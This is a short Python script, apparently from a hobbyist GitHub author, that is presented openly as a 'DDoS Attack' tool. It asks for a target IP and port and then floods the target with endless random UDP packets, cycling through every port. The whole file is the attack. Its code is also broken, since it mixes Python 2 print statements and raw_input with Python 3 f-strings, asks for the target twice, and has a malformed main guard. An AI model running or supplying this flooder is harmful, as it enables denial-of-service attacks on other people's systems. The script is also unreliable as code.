import sys
import os
import time
import socket
import random
from datetime import datetime

# color
GREEN = '\033[92m'
CYAN = '\033[96m'
RED = '\033[91m'
YELLOW = '\033[93m'
RESET = '\033[0m'

# matn
def print_banner():
    os.system("clear")
    os.system("figlet -f slant 'DDoS Attack'")
    print "Author   : mhmd-error"
    print "github   : https://github.com/mhmd138az"
    ip = raw_input("IP Target : ")
    port = input("Port       : ")
def show_progress_bar():
    for i in range(101):
        time.sleep(0.05)
        os.system("clear")
        print(f"{CYAN}[====================] {i}%{RESET}")
        if i < 25:
            print(f"{GREEN}[                    ] 0%{RESET}")
        elif i < 50:
            print(f"{GREEN}[=====               ] 25%{RESET}")
        elif i < 75:
            print(f"{GREEN}[==========          ] 50%{RESET}")
        elif i < 100:
            print(f"{GREEN}[===============     ] 75%{RESET}")
        else:
            print(f"{GREEN}[====================] 100%{RESET}")

def start_attack(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))
        sent += 1
        port = port + 1
        if port > 65535:
            port = 1
        os.system("clear")
        print(f"{RED}DDoS Attack in Progress...{RESET}")
        print(f"{YELLOW}Sending packet {sent} to {ip} through port {port}{RESET}")
        time.sleep(0.1)

def main():
    print_banner()
    
    ip = input(f"{GREEN}Enter Target IP: {RESET}")
    port = int(input(f"{GREEN}Enter Target Port: {RESET}"))
    
    print(f"{CYAN}Initializing attack...{RESET}")
    show_progress_bar()
    
    print(f"{RED}Attack starting...{RESET}")
    start_attack(ip, port)

if name == "main":
    main()
